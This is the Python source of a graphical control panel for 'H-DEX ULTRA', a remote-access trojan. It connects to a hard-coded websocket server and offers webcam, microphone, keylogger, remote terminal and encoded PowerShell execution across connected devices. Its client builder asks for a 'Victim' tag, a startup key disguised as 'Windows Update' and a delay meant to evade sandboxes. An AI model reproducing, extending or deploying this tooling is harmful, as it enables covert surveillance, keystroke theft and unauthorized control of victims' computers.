import matplotlib
matplotlib.use("TkAgg")
from matplotlib.figure import Figure
from matplotlib.backends.backend_tkagg import FigureCanvasTkAgg
import numpy as np
import asyncio
import websockets
import ssl
import json
import threading
import tkinter as tk
from tkinter import messagebox, filedialog, simpledialog
import customtkinter as ctk
from PIL import Image, ImageTk
import io
import base64
import os
import socket
import hashlib
import subprocess
import time
import sounddevice as sd

# Configuration
CONFIG_FILE = "config.json"
DEFAULT_SERVER = "wss://realmrhacker-h-dex.hf.space/ws"

# --- Premium Themes - Redesigned for Maximum Visual Impact ---
THEMES = {
    "🔥 Ultra OLED": {
        "bg": "#000000",
        "surface": "#09090b",
        "surface_light": "#18181b",
        "surface_glass": "rgba(9, 9, 11, 0.95)",
        "accent": "#facc15",
        "accent_gradient": "#fef08a",
        "accent_secondary": "#eab308",
        "text": "#fafafa",
        "text_dim": "#a1a1aa",
        "border": "#27272a",
        "hover": "#27272a",
        "success": "#4ade80",
        "danger": "#f87171",
        "warning": "#facc15",
        "card_bg": "#000000",
        "glow": "0 0 20px rgba(250, 204, 21, 0.2)"
    },
    "⚡ Cyber Matrix": {
        "bg": "#050505",
        "surface": "#111111",
        "surface_light": "#1a1a1a",
        "surface_glass": "rgba(5, 5, 5, 0.95)",
        "accent": "#00ff41",
        "accent_gradient": "#39ff14",
        "accent_secondary": "#00ffcc",
        "text": "#ffffff",
        "text_dim": "#00aa2a",
        "border": "#003300",
        "hover": "#002200",
        "success": "#00ff41",
        "danger": "#ff003c",
        "warning": "#ffe600",
        "card_bg": "#090909",
        "glow": "0 0 25px rgba(0, 255, 65, 0.3)"
    },
    "🌌 Deep Void": {
        "bg": "#030014",
        "surface": "#0a0129",
        "surface_light": "#140348",
        "surface_glass": "rgba(10, 1, 41, 0.9)",
        "accent": "#8b5cf6",
        "accent_gradient": "#a78bfa",
        "accent_secondary": "#c084fc",
        "text": "#f8fafc",
        "text_dim": "#94a3b8",
        "border": "#312e81",
        "hover": "#1e1b4b",
        "success": "#10b981",
        "danger": "#ef4444",
        "warning": "#f59e0b",
        "card_bg": "#06011c",
        "glow": "0 0 30px rgba(139, 92, 246, 0.35)"
    },
    "🩸 Crimson Apex": {
        "bg": "#050000",
        "surface": "#120000",
        "surface_light": "#240000",
        "surface_glass": "rgba(18, 0, 0, 0.92)",
        "accent": "#ef4444",
        "accent_gradient": "#f87171",
        "accent_secondary": "#dc2626",
        "text": "#fef2f2",
        "text_dim": "#fca5a5",
        "border": "#450a0a",
        "hover": "#3f0000",
        "success": "#10b981",
        "danger": "#ff0000",
        "warning": "#f59e0b",
        "card_bg": "#0a0000",
        "glow": "0 0 20px rgba(239, 68, 68, 0.4)"
    },
    "🌊 Aqua Ghost": {
        "bg": "#020617",
        "surface": "#0f172a",
        "surface_light": "#1e293b",
        "surface_glass": "rgba(15, 23, 42, 0.85)",
        "accent": "#38bdf8",
        "accent_gradient": "#7dd3fc",
        "accent_secondary": "#0ea5e9",
        "text": "#f1f5f9",
        "text_dim": "#94a3b8",
        "border": "#334155",
        "hover": "#0f172a",
        "success": "#34d399",
        "danger": "#fb7185",
        "warning": "#fbbf24",
        "card_bg": "#0b1120",
        "glow": "0 0 20px rgba(56, 189, 248, 0.3)"
    },
    "🎮 Obsidian Pro": {
        "bg": "#0f111a",
        "surface": "#171923",
        "surface_light": "#202431",
        "surface_glass": "rgba(23, 25, 35, 0.95)",
        "accent": "#6366f1",
        "accent_gradient": "#818cf8",
        "accent_secondary": "#4f46e5",
        "text": "#f8fafc",
        "text_dim": "#cbd5e1",
        "border": "#334155",
        "hover": "#1e293b",
        "success": "#10b981",
        "danger": "#ef4444",
        "warning": "#f59e0b",
        "card_bg": "#12141d",
        "glow": "0 0 15px rgba(99, 102, 241, 0.3)"
    },
    "☀️ Stark Light": {
        "bg": "#ffffff",
        "surface": "#f8fafc",
        "surface_light": "#f1f5f9",
        "surface_glass": "rgba(255, 255, 255, 0.95)",
        "accent": "#0f172a",
        "accent_gradient": "#1e293b",
        "accent_secondary": "#334155",
        "text": "#020617",
        "text_dim": "#64748b",
        "border": "#e2e8f0",
        "hover": "#f1f5f9",
        "success": "#059669",
        "danger": "#dc2626",
        "warning": "#d97706",
        "card_bg": "#ffffff",
        "glow": "0 4px 12px rgba(0,0,0,0.05)"
    }
}



ctk.set_appearance_mode("Dark")

class ToolTip:
    def __init__(self, widget, text, colors):
        self.widget = widget
        self.text = text
        self.colors = colors
        self.tooltip = None
        self.widget.bind("<Enter>", self.show_tooltip)
        self.widget.bind("<Leave>", self.hide_tooltip)

    def show_tooltip(self, event):
        x = self.widget.winfo_rootx() + 25
        y = self.widget.winfo_rooty() + 25
        self.tooltip = tk.Toplevel(self.widget)
        self.tooltip.wm_overrideredirect(True)
        self.tooltip.wm_geometry(f"+{x}+{y}")
        label = ctk.CTkLabel(self.tooltip, text=self.text, fg_color=self.colors["surface"], text_color=self.colors["text"], corner_radius=5, width=200)
        label.pack()

    def hide_tooltip(self, event):
        if self.tooltip:
            self.tooltip.destroy()
            self.tooltip = None

class AdminDashboardApp:
    def __init__(self, root):
        self.root = root
        self.themes = THEMES
        self.config = self.load_config()
        self.theme_name = self.config.get("theme", list(self.themes.keys())[0])
        if self.theme_name not in self.themes:
            self.theme_name = list(self.themes.keys())[0]
            
        self.colors = self.themes[self.theme_name].copy()
        
        # Apply custom accent if exists
        custom_accent = self.config.get("custom_accent")
        if custom_accent:
            self.colors["accent"] = custom_accent

        self.root.title("H-DEX ULTRA v3.1 - Remote Administration")
        self.root.geometry("1400x900")
        self.root.configure(bg=self.colors["bg"])
        
        if not self.check_password():
            self.root.destroy()
            return

        self.server_uri = self.config.get("server_uri", DEFAULT_SERVER)
        
        # Normalize URI on startup
        if "hf.space" in self.server_uri and not self.server_uri.endswith("/ws"):
            self.server_uri = self.server_uri.rstrip("/") + "/ws"
            self.config["server_uri"] = self.server_uri
            self.save_config()

        self.main_container = ctk.CTkFrame(root, fg_color=self.colors["bg"], corner_radius=0)
        self.main_container.pack(fill=tk.BOTH, expand=True)

        self.sidebar = ctk.CTkFrame(self.main_container, width=280, fg_color=self.colors["surface"], corner_radius=0, border_width=0)
        self.sidebar.pack(side=tk.LEFT, fill=tk.Y)
        
        # Sidebar Header / Profile Card
        header_frame = ctk.CTkFrame(self.sidebar, fg_color=self.colors.get("surface_light", "#1c1c1c"), corner_radius=15)
        header_frame.pack(fill=tk.X, padx=15, pady=(25, 20))
        
        try:
            logo_img = Image.open("logo.png")
            logo_img = logo_img.resize((45, 45), Image.Resampling.LANCZOS)
            self.logo_photo = ImageTk.PhotoImage(logo_img)
            self.logo_label = tk.Label(header_frame, image=self.logo_photo, bg=self.colors.get("surface_light", "#1c1c1c"), borderwidth=0)
            self.logo_label.pack(side=tk.LEFT, padx=(15, 10), pady=15)
        except:
            self.logo_label = ctk.CTkLabel(header_frame, text="H", font=("Segoe UI", 28, "bold"), text_color=self.colors["accent"], width=45, height=45, corner_radius=10, fg_color=self.colors["surface"])
            self.logo_label.pack(side=tk.LEFT, padx=(15, 10), pady=15)

        title_frame = ctk.CTkFrame(header_frame, fg_color="transparent")
        title_frame.pack(side=tk.LEFT, pady=15)
        
        ctk.CTkLabel(title_frame, text="H-DEX ULTRA", font=("Segoe UI", 16, "bold"), text_color=self.colors["text"]).pack(anchor="w")
        
        badge_frame = ctk.CTkFrame(title_frame, fg_color="transparent")
        badge_frame.pack(anchor="w", pady=(2, 0))
        ctk.CTkLabel(badge_frame, text="ADMIN", font=("Segoe UI", 9, "bold"), text_color=self.colors["bg"], fg_color=self.colors["accent"], corner_radius=4, padx=6).pack(side=tk.LEFT)
        ctk.CTkLabel(badge_frame, text="v3.1", font=("Consolas", 10), text_color=self.colors["text_dim"]).pack(side=tk.LEFT, padx=(6, 0))

        self.nav_buttons = {}
        nav_groups = [
            ("OVERVIEW", [
                ("🏠", "Dashboard"),
                ("📜", "Scripts"),
            ]),
            ("TOOLS", [
                ("🔗", "Link Changer"),
                ("🔧", "Builder"),
            ]),
            ("SYSTEM", [
                ("⚙️", "Settings"),
                ("ℹ️", "About"),
            ]),
        ]

        for group_label, nav_items in nav_groups:
            # Section divider
            divider_frame = ctk.CTkFrame(self.sidebar, fg_color="transparent")
            divider_frame.pack(fill=tk.X, padx=20, pady=(18, 6))
            ctk.CTkLabel(divider_frame, text=group_label, font=("Segoe UI", 10, "bold"), text_color=self.colors["text_dim"]).pack(side=tk.LEFT)
            ctk.CTkFrame(divider_frame, fg_color=self.colors["border"], height=1).pack(side=tk.LEFT, fill=tk.X, expand=True, padx=(10, 0))

            for icon, item in nav_items:
                btn_frame = ctk.CTkFrame(self.sidebar, fg_color="transparent")
                btn_frame.pack(fill=tk.X, padx=15, pady=2)
                
                indicator = ctk.CTkFrame(btn_frame, width=4, height=32, fg_color="transparent", corner_radius=5)
                indicator.pack(side=tk.LEFT, padx=(0, 8))
                
                btn = ctk.CTkButton(btn_frame, text=f"  {icon}   {item.upper()}", command=lambda i=item: self.show_view(i.lower()),
                                     fg_color="transparent", text_color=self.colors["text_dim"], hover_color=self.colors["hover"],
                                     font=("Segoe UI Semibold", 13), anchor="w", height=44, corner_radius=12)
                btn.pack(side=tk.LEFT, fill=tk.X, expand=True)
                
                def on_enter(e, b=btn, i=item):
                    if self.current_view != i.lower():
                        b.configure(text_color=self.colors["text"])
                def on_leave(e, b=btn, i=item):
                    if self.current_view != i.lower():
                        b.configure(text_color=self.colors["text_dim"])
                        
                btn.bind("<Enter>", on_enter)
                btn.bind("<Leave>", on_leave)
                
                self.nav_buttons[item.lower()] = (btn, indicator)

        # Server status section at bottom
        status_card = ctk.CTkFrame(self.sidebar, fg_color=self.colors.get("surface_light", self.colors["hover"]), corner_radius=15, border_width=1, border_color=self.colors["border"])
        status_card.pack(side=tk.BOTTOM, fill=tk.X, padx=20, pady=20)
        
        status_header = ctk.CTkFrame(status_card, fg_color="transparent")
        status_header.pack(fill=tk.X, padx=15, pady=(15, 5))
        
        ctk.CTkLabel(status_header, text="SERVER", font=("Segoe UI", 10, "bold"), text_color=self.colors["text_dim"]).pack(side=tk.LEFT)
        self.status_dot = ctk.CTkLabel(status_header, text="●", font=("Segoe UI", 14), text_color=self.colors.get("danger", "red"))
        self.status_dot.pack(side=tk.RIGHT)

        self.status_label = ctk.CTkLabel(status_card, text="Offline", text_color=self.colors["text"], font=("Segoe UI", 14, "bold"))
        self.status_label.pack(anchor="w", padx=15, pady=(0, 10))
        
        self.change_server_btn = ctk.CTkButton(status_card, text="Switch Server", command=self.change_server, 
                              fg_color=self.colors["bg"], hover_color=self.colors["hover"],
                              border_width=1, border_color=self.colors["border"], text_color=self.colors["text"], 
                              height=32, corner_radius=10, font=("Segoe UI", 12))
        self.change_server_btn.pack(fill=tk.X, padx=15, pady=(0, 15))

        self.content_area = ctk.CTkFrame(self.main_container, fg_color=self.colors["bg"], corner_radius=0)
        self.content_area.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=20, pady=20)

        self.views = {}
        
        # --- NEW: Link Changer State ---
        self.server_links = self.load_server_links()
        self.link_rows = []
        # -------------------------------
        
        self._create_dashboard_view()
        self._create_scripts_view()
        self._create_link_changer_view()
        self._create_builder_view()
        self._create_settings_view()
        self._create_about_view()
        
        self.show_view("dashboard")
        self.current_view = "dashboard"
        
        self.websocket = None
        self.loop = None
        self.running = True
        self.viewers = {}
        self.webcam_viewers = {}
        self.file_explorers = {}
        self.terminals = {}
        self.process_managers = {}
        self.keyloggers = {}
        self.sys_infos = {}
        self.metrics_viewers = {}
        self.microphone_viewers = {}
        self.control_panels = {}
        self.network_explorers = {}
        self.bulk_executors = {}
        self.quick_pranks = {}
        self.selected_devices = set() # Set of selected device IDs
        self.device_groups = {"All Devices": []}
        self.current_group = "All Devices"
        self.device_rows = {}
        
        # --- NEW: Device Notes ---
        self.device_notes = self.load_device_notes()
        # -------------------------
        
        self.macro_recording = False
        self.macro_buffer = []

        self.thread = threading.Thread(target=self.start_async_loop, daemon=True)
        self.thread.start()
        self.root.protocol("WM_DELETE_WINDOW", self.on_close)

    def show_view(self, name):
        self.current_view = name
        for v in self.views.values(): v.pack_forget()
        self.views[name].pack(fill=tk.BOTH, expand=True)
        for n, (btn, indicator) in self.nav_buttons.items():
            is_active = (n == name)
            btn.configure(text_color=self.colors["accent"] if is_active else self.colors["text_dim"],
                          fg_color=self.colors["hover"] if is_active else "transparent")
            indicator.configure(fg_color=self.colors["accent"] if is_active else "transparent")

    def _create_dashboard_view(self):
        view = ctk.CTkFrame(self.content_area, fg_color="transparent")
        self.views["dashboard"] = view
        
        # --- Premium Top Welcome Header ---
        welcome_bar = ctk.CTkFrame(view, fg_color=self.colors["surface"], corner_radius=18, height=70, border_width=1, border_color=self.colors["border"])
        welcome_bar.pack(fill=tk.X, pady=(0, 20))
        welcome_bar.pack_propagate(False)
        
        welcome_left = ctk.CTkFrame(welcome_bar, fg_color="transparent")
        welcome_left.pack(side=tk.LEFT, padx=25, fill=tk.Y, expand=False)
        ctk.CTkLabel(welcome_left, text="Welcome back, Admin", font=("Segoe UI", 18, "bold"), text_color=self.colors["text"]).pack(side=tk.TOP, anchor="w", pady=(14, 0))
        ctk.CTkLabel(welcome_left, text="Here's your command overview", font=("Segoe UI", 11), text_color=self.colors["text_dim"]).pack(side=tk.TOP, anchor="w")
        
        self.clock_label = ctk.CTkLabel(welcome_bar, text="", font=("Consolas", 14, "bold"), text_color=self.colors["accent"])
        self.clock_label.pack(side=tk.RIGHT, padx=25)
        self._update_clock()

        # --- Stats Overview Panel ---
        stats_frame = ctk.CTkFrame(view, fg_color="transparent")
        stats_frame.pack(fill=tk.X, pady=(0, 25))
        
        # Stats cards
        self.stats_data = [
            ("🖥️", "Connected", "0", "DEVICES"),
            ("📡", "Active Streams", "0", "STREAMS"),
            ("⏱️", "Uptime", "0m", "SESSION"),
            ("🌐", "Server", "Online", "STATUS")
        ]
        self.stat_labels = []
        
        for i, (icon, title, value, subtitle) in enumerate(self.stats_data):
            # Dynamic distinct accents for each stat card
            accents = [self.colors["accent"], self.colors.get("success", "#10B981"), self.colors.get("warning", "#F59E0B"), self.colors.get("danger", "#EF4444")]
            card_accent = accents[i % len(accents)]
            
            stat_card = ctk.CTkFrame(stats_frame, fg_color=self.colors["surface"], corner_radius=18, border_width=1, border_color=self.colors["border"])
            stat_card.pack(side=tk.LEFT, expand=True, fill=tk.BOTH, padx=10)
            
            # Top color accent strip
            top_line = ctk.CTkFrame(stat_card, fg_color=card_accent, height=4, corner_radius=2)
            top_line.pack(fill=tk.X, side=tk.TOP)
            
            inner = ctk.CTkFrame(stat_card, fg_color="transparent")
            inner.pack(padx=20, pady=(15, 20), fill=tk.BOTH, expand=True)
            
            # Card Header (Title & Icon)
            c_header = ctk.CTkFrame(inner, fg_color="transparent")
            c_header.pack(fill=tk.X)
            ctk.CTkLabel(c_header, text=subtitle, font=("Segoe UI", 11, "bold"), text_color=self.colors["text_dim"]).pack(side=tk.LEFT)
            ctk.CTkLabel(c_header, text=icon, font=("Segoe UI", 18)).pack(side=tk.RIGHT)
            
            val_label = ctk.CTkLabel(inner, text=value, font=("Segoe UI", 36, "bold"), text_color=self.colors["text"])
            val_label.pack(anchor="w", pady=(15, 0))
            self.stat_labels.append(val_label)

        # --- System Health Meter (Premium UX) ---
        health_frame = ctk.CTkFrame(view, fg_color=self.colors["surface"], corner_radius=20, height=100, border_width=1, border_color=self.colors["border"])
        health_frame.pack(fill=tk.X, pady=(0, 25))
        health_frame.pack_propagate(False)
        
        ctk.CTkLabel(health_frame, text="🛡️ NETWORK SECURITY HEALTH", font=("Segoe UI", 11, "bold"), text_color=self.colors["text_dim"]).pack(side=tk.LEFT, padx=25)
        
        self.health_bar = ctk.CTkProgressBar(health_frame, width=400, height=12, corner_radius=10, 
                                               progress_color=self.colors["success"], fg_color=self.colors["bg"])
        self.health_bar.pack(side=tk.LEFT, padx=20)
        self.health_bar.set(0.85) # Simulating 85% health/stealth
        
        ctk.CTkLabel(health_frame, text="85% SECURE", font=("Segoe UI", 14, "bold"), text_color=self.colors["success"]).pack(side=tk.LEFT)
        
        ctk.CTkButton(health_frame, text="RUN SECURITY SCAN", width=150, height=35, 
                      fg_color=self.colors["accent"], text_color=self.colors["bg"], font=("Segoe UI", 11, "bold"),
                      command=self.run_security_scan).pack(side=tk.RIGHT, padx=25)
        
        # --- Search/Filter Bar ---
        search_frame = ctk.CTkFrame(view, fg_color="transparent")
        search_frame.pack(fill=tk.X, pady=(0, 20))
        
        # Group Selector
        self.group_var = ctk.StringVar(value="All Devices")
        self.group_combo = ctk.CTkComboBox(search_frame, values=["All Devices"], variable=self.group_var, 
                                           width=150, height=40, font=("Segoe UI", 12),
                                           command=self.filter_devices_by_group)
        self.group_combo.pack(side=tk.LEFT, padx=(0, 10))

        ctk.CTkLabel(search_frame, text="CONNECTED DEVICES", font=("Segoe UI", 12, "bold"), 
                     text_color=self.colors["text_dim"]).pack(side=tk.LEFT, padx=10)
        
        self.device_search = ctk.CTkEntry(search_frame, placeholder_text="Search by ID, Name or IP...", 
                                           width=300, height=40, corner_radius=12,
                                           fg_color=self.colors["surface"], border_color=self.colors["border"])
        self.device_search.pack(side=tk.RIGHT, padx=10)
        self.device_search.bind("<KeyRelease>", self.filter_devices)
        
        # Multi-select Toggle
        self.select_all_var = ctk.BooleanVar(value=False)
        self.select_all_chk = ctk.CTkCheckBox(search_frame, text="Select All", variable=self.select_all_var, 
                                              command=self.toggle_select_all, width=20, checkbox_width=20, checkbox_height=20)
        self.select_all_chk.pack(side=tk.RIGHT, padx=15)

        # Export Button
        export_btn = ctk.CTkButton(search_frame, text="Export Info", width=80, height=32,
                                   font=("Segoe UI", 12), fg_color=self.colors["surface_light"],
                                   command=self.export_data)
        export_btn.pack(side=tk.RIGHT, padx=5)
        
        # --- Device Grid ---
        self.device_scroll = ctk.CTkScrollableFrame(view, fg_color="transparent")
        self.device_scroll.pack(fill=tk.BOTH, expand=True)
        
        # Grid configuration
        self.device_grid = ctk.CTkFrame(self.device_scroll, fg_color="transparent")
        self.device_grid.pack(fill=tk.X)
        self.device_grid.columnconfigure((0, 1, 2), weight=1)
        
        # Empty state — premium placeholder
        empty_container = ctk.CTkFrame(self.device_scroll, fg_color="transparent")
        empty_container.pack(pady=60)
        ctk.CTkLabel(empty_container, text="📡", font=("Segoe UI", 48)).pack()
        self.empty_label = ctk.CTkLabel(empty_container, text="NO DEVICES CONNECTED",
                                         font=("Segoe UI", 16, "bold"), text_color=self.colors["text_dim"])
        self.empty_label.pack(pady=(10, 5))
        ctk.CTkLabel(empty_container, text="Waiting for incoming connections...\nDevices will appear here automatically.",
                     font=("Segoe UI", 12), text_color=self.colors["text_dim"], justify="center").pack()
        
        # --- Quick Actions Toolbar ---
        actions_bar = ctk.CTkFrame(view, fg_color=self.colors["surface"], corner_radius=20, border_width=1, border_color=self.colors["border"])
        actions_bar.pack(fill=tk.X, pady=(20, 0))

        actions_label_frame = ctk.CTkFrame(actions_bar, fg_color="transparent")
        actions_label_frame.pack(fill=tk.X, padx=20, pady=(12, 0))
        ctk.CTkLabel(actions_label_frame, text="⚡ QUICK ACTIONS", font=("Segoe UI", 10, "bold"), text_color=self.colors["text_dim"]).pack(side=tk.LEFT)

        actions_inner = ctk.CTkFrame(actions_bar, fg_color="transparent")
        actions_inner.pack(fill=tk.X, padx=10, pady=(5, 12))
        
        btns_data = [
            ("🖥️", "Desktop", self.open_remote_desktop),
            ("📷", "Webcam", self.open_webcam_viewer),
            ("🎤", "Audio", self.open_microphone_viewer),
            ("📁", "Files", self.open_file_manager),
            ("💻", "Terminal", self.open_terminal),
            ("📊", "Tasks", self.open_process_manager),
            ("📈", "Metrics", self.open_metrics_viewer),
            ("🎛️", "Control", self.open_control_panel),
            ("🔑", "Logs", self.open_keylogger),
            ("🌐", "Network", self.open_network_explorer),
            ("🔥", "Bulk Cmd", self.open_bulk_executor),
            ("📢", "Broadcast", self.broadcast_message),
            ("⏻", "Power", self.request_shutdown)
        ]
        
        for icon, label, cmd in btns_data:
            btn_container = ctk.CTkFrame(actions_inner, fg_color="transparent")
            btn_container.pack(side=tk.LEFT, expand=True, padx=2)
            btn = ctk.CTkButton(btn_container, text=icon, command=cmd, width=48, height=42,
                               fg_color=self.colors.get("surface_light", self.colors["hover"]), hover_color=self.colors["hover"],
                               text_color=self.colors["accent"], font=("Segoe UI", 18), corner_radius=12)
            btn.pack()
            ctk.CTkLabel(btn_container, text=label, font=("Segoe UI", 9), text_color=self.colors["text_dim"]).pack(pady=(2, 0))
            ToolTip(btn, label, self.colors)

    def _update_clock(self):
        """Update the live clock in the welcome header."""
        try:
            now = time.strftime("%A, %b %d  •  %I:%M:%S %p")
            self.clock_label.configure(text=now)
        except:
            pass
        self.root.after(1000, self._update_clock)

    def filter_devices(self, event=None):
        """Filter device list by search term using grid visibility"""
        term = self.device_search.get().lower()
        for dev_id, card in self.device_rows.items():
            # Basic text matching for name/ip/id
            # Note: We don't have the original dev dict here, but we can check card labels if we want to be thorough.
            # Simplified: Use the search in ID and trigger refresh
            if term == "" or term in str(dev_id).lower():
                card.grid()
            else:
                card.grid_remove()

    def _create_scripts_view(self):
        view = ctk.CTkFrame(self.content_area, fg_color="transparent")
        self.views["scripts"] = view
        
        # Split: List vs Editor
        panes = tk.PanedWindow(view, orient=tk.HORIZONTAL, sashwidth=4, bg=self.colors["border"], bd=0)
        panes.pack(fill=tk.BOTH, expand=True)
        
        # Left: Script List
        list_frame = ctk.CTkFrame(panes, fg_color=self.colors["surface"], width=200, corner_radius=10)
        panes.add(list_frame)
        
        ctk.CTkLabel(list_frame, text="Saved Scripts", font=("Segoe UI", 16, "bold"), text_color=self.colors["text"]).pack(pady=15)
        
        self.script_list = ctk.CTkScrollableFrame(list_frame, fg_color="transparent")
        self.script_list.pack(fill=tk.BOTH, expand=True, padx=10, pady=(0, 10))
        
        # Buttons under list
        l_btn_frame = ctk.CTkFrame(list_frame, fg_color="transparent")
        l_btn_frame.pack(fill=tk.X, padx=10, pady=10)
        ctk.CTkButton(l_btn_frame, text="New", width=60, command=self.new_script, fg_color=self.colors["accent"]).pack(side=tk.LEFT, padx=2)
        ctk.CTkButton(l_btn_frame, text="Delete", width=60, command=self.delete_script, fg_color="red").pack(side=tk.RIGHT, padx=2)

        # Right: Editor
        editor_frame = ctk.CTkFrame(panes, fg_color="transparent")
        panes.add(editor_frame)
        
        # Editor Toolbar
        toolbar = ctk.CTkFrame(editor_frame, fg_color=self.colors["surface"], height=50)
        toolbar.pack(fill=tk.X, pady=(0, 10))
        
        self.script_name_entry = ctk.CTkEntry(toolbar, placeholder_text="Script Name (e.g., clean_temp.ps1)", width=250)
        self.script_name_entry.pack(side=tk.LEFT, padx=15, pady=10)
        
        ctk.CTkButton(toolbar, text="Save", width=80, command=self.save_script, fg_color=self.colors["accent"]).pack(side=tk.LEFT, padx=5)
        
        # Run Controls
        run_frame = ctk.CTkFrame(toolbar, fg_color="transparent")
        run_frame.pack(side=tk.RIGHT, padx=15)
        
        self.script_target_var = ctk.StringVar(value="Powershell")
        ctk.CTkComboBox(run_frame, values=["Powershell", "Batch", "Python", "Macro (JSON)"], variable=self.script_target_var, width=120).pack(side=tk.LEFT, padx=5)
        
        # Macro Record Button
        self.record_btn_text = ctk.StringVar(value="● Rec")
        self.record_btn = ctk.CTkButton(run_frame, textvariable=self.record_btn_text, width=60, command=self.toggle_macro_recording, fg_color="#F43F5E", hover_color="#BE123C")
        self.record_btn.pack(side=tk.LEFT, padx=5)

        ctk.CTkButton(run_frame, text="▶ Run on Selected", width=120, command=self.run_script, fg_color="#10B981").pack(side=tk.LEFT, padx=5)

        # Editor Text Area
        self.script_editor = ctk.CTkTextbox(editor_frame, fg_color=self.colors["surface"], text_color=self.colors["text"], font=("Consolas", 12))
        self.script_editor.pack(fill=tk.BOTH, expand=True)
        
        # Load scripts
        if not os.path.exists("scripts"): os.makedirs("scripts")
        self.refresh_script_list()

    def refresh_script_list(self):
        for w in self.script_list.winfo_children(): w.destroy()
        if not os.path.exists("scripts"): return
        
        for f in os.listdir("scripts"):
            if f.endswith(".ps1") or f.endswith(".bat") or f.endswith(".py") or f.endswith(".json"):
                btn = ctk.CTkButton(self.script_list, text=f, fg_color="transparent", anchor="w", text_color=self.colors["text"],
                                    command=lambda n=f: self.load_script(n))
                btn.pack(fill=tk.X, pady=1)

    def toggle_macro_recording(self):
        if not self.macro_recording:
            # Start Recording
            self.macro_recording = True
            self.macro_buffer = []
            self.record_btn_text.set("■ Stop")
            self.record_btn.configure(fg_color="#F43F5E") # Standard Red
            # Maybe flash?
            messagebox.showinfo("Recording", "Macro recording started. Actions sent to devices will be recorded.")
        else:
            # Stop Recording
            self.macro_recording = False
            self.record_btn_text.set("● Rec")
            self.record_btn.configure(fg_color="#F43F5E")
            
            if self.macro_buffer:
                # Save to editor
                self.script_target_var.set("Macro (JSON)")
                self.script_name_entry.delete(0, tk.END)
                self.script_name_entry.insert(0, f"macro_{int(time.time())}.json")
                self.script_editor.delete("1.0", tk.END)
                self.script_editor.insert("1.0", json.dumps(self.macro_buffer, indent=4))
                messagebox.showinfo("Recording Stopped", f"Captured {len(self.macro_buffer)} actions. Saved to editor.")
            else:
                messagebox.showinfo("Recording Stopped", "No actions captured.")

    def new_script(self):
        self.script_name_entry.delete(0, tk.END)
        self.script_editor.delete("1.0", tk.END)

    def load_script(self, name):
        try:
            with open(os.path.join("scripts", name), "r") as f: content = f.read()
            self.script_name_entry.delete(0, tk.END)
            self.script_name_entry.insert(0, name)
            self.script_editor.delete("1.0", tk.END)
            self.script_editor.insert("1.0", content)
        except Exception as e: messagebox.showerror("Error", str(e))

    def save_script(self):
        name = self.script_name_entry.get()
        if not name: return messagebox.showwarning("Warning", "Enter a script name!")
        content = self.script_editor.get("1.0", tk.END)
        
        try:
            with open(os.path.join("scripts", name), "w") as f: f.write(content.strip())
            self.refresh_script_list()
            messagebox.showinfo("Success", "Script saved.")
        except Exception as e: messagebox.showerror("Error", str(e))

    def delete_script(self):
        name = self.script_name_entry.get()
        if not name or not os.path.exists(os.path.join("scripts", name)): return
        if messagebox.askyesno("Confirm", f"Delete {name}?"):
            os.remove(os.path.join("scripts", name))
            self.new_script()
            self.refresh_script_list()

    def run_script(self):
        if not self.selected_devices:
            messagebox.showwarning("No Selection", "Please select devices in Dashboard first!")
            return
            
        content = self.script_editor.get("1.0", tk.END).strip()
        if not content: return
        
        lang = self.script_target_var.get()
        
        if lang == "Macro (JSON)":
             try:
                 actions = json.loads(content)
                 if messagebox.askyesno("Run Macro", f"Execute {len(actions)} actions on {len(self.selected_devices)} devices?"):
                     # Run in thread to allow delays
                     def run_macro_thread():
                         for action in actions:
                             # Replay action on all selected devices
                             for dev_id in self.selected_devices:
                                 cmd = action.copy()
                                 cmd["target_id"] = dev_id
                                 self.send_json(cmd)
                             time.sleep(0.5) # Small delay between actions
                         messagebox.showinfo("Macro", "Macro execution complete.")
                     threading.Thread(target=run_macro_thread, daemon=True).start()
             except json.JSONDecodeError:
                 messagebox.showerror("Error", "Invalid JSON format")
             return

        # Simplistic execution logic for scripts
        cmd = ""
        if lang == "Powershell":
            # Encode command
            encoded = base64.b64encode(content.encode('utf-16le')).decode('utf-8')
            cmd = f"powershell -EncodedCommand {encoded}"
        elif lang == "Batch":
             cmd = content.replace("\n", " & ")
        elif lang == "Python":
            cmd = f"python -c \"{content.replace(chr(34), chr(39))}\""
            
        if messagebox.askyesno("Run Script", f"Run this script on {len(self.selected_devices)} devices?"):
            for dev_id in self.selected_devices:
                self.send_json({"type": "execute_command", "target_id": dev_id, "command": cmd})
            messagebox.showinfo("Sent", "Script execution command sent.")

    def _create_builder_view(self):
        view = ctk.CTkFrame(self.content_area, fg_color="transparent")
        self.views["builder"] = view
        
        ctk.CTkLabel(view, text="CLIENT BUILDER", font=("Segoe UI", 24, "bold"), text_color=self.colors["accent"]).pack(anchor="w", pady=(0, 20))
        
        self.builder_form = ctk.CTkFrame(view, fg_color=self.colors["surface"], corner_radius=20, border_width=1, border_color=self.colors["border"])
        self.builder_form.pack(fill=tk.X, padx=20, pady=20)
        
        ctk.CTkLabel(self.builder_form, text="CONFIGURATION", font=("Segoe UI", 12, "bold"), text_color=self.colors["text_dim"]).pack(anchor="w", padx=25, pady=(25, 10))
        
        self.build_uri = ctk.CTkEntry(self.builder_form, placeholder_text="Server URI (e.g. wss://your-server.com)", height=45, corner_radius=12, fg_color=self.colors["bg"], border_color=self.colors["border"])
        self.build_uri.pack(fill=tk.X, padx=25, pady=5)
        
        self.build_tag = ctk.CTkEntry(self.builder_form, placeholder_text="Client Tag (e.g. Victim-1)", height=45, corner_radius=12, fg_color=self.colors["bg"], border_color=self.colors["border"])
        self.build_tag.pack(fill=tk.X, padx=25, pady=5)

        self.build_icon = ctk.CTkEntry(self.builder_form, placeholder_text="Icon Path (.ico)", height=45, corner_radius=12, fg_color=self.colors["bg"], border_color=self.colors["border"])
        self.build_icon.pack(fill=tk.X, padx=25, pady=5)

        self.build_startup_name = ctk.CTkEntry(self.builder_form, placeholder_text="Startup Key Name (e.g. Windows Update)", height=45, corner_radius=12, fg_color=self.colors["bg"], border_color=self.colors["border"])
        self.build_startup_name.pack(fill=tk.X, padx=25, pady=5)
        self.build_startup_name.insert(0, "H-Dex Client")

        self.build_delay = ctk.CTkEntry(self.builder_form, placeholder_text="Sleep Delay (seconds) - Evade sandbox", height=45, corner_radius=12, fg_color=self.colors["bg"], border_color=self.colors["border"])
        self.build_delay.pack(fill=tk.X, padx=25, pady=5)
        self.build_delay.insert(0, "0")

